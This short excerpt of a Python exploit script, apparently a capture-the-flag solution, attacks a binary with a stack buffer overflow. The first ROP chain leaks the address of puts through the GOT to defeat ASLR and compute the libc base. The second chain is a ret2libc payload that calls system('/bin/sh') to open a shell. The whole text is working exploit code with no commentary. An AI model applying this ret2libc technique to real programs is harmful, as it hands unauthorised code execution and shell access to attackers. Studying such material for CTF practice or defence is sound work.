...
sla("hello",
    b"a"*0xa + b"bi0xbi0x"  + p64(rg(binary,"pop|ret","rdi")) + p64(elf.got["puts"]) + p64(elf.plt["puts"]) + p64(elf.sym["main"])  
)

libc.address = uu64(ru(b"\x7f",False)[-6:]) - libc.sym["puts"]
leak("base",libc.address)

sla("hello",
    b"b"*0xa + b"bi0xbi0x" + p64(next(libc.search(asm("ret")))) + p64(rg(binary,"pop|ret","rdi")) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.sym["system"])
)
